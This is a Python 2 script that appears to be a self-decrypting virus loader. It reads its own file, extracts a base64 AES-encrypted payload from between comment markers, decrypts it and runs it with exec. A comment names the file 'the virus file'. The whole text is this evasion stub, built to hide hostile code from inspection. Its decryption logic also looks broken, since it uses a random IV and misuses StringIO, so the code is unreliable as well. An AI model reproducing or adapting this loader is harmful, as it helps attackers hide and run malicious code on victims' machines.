print "HELOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO"

######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os
import __main__
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES


# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(this).read(24), AES.MODE_CFB, iv)

   this.close()
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '# Start payload':
      copy = True
   elif line.strip() == '# End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
print e
exec e
sys.exit('Good job!')
# End Uncrypted
# Start payload
#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
# End payload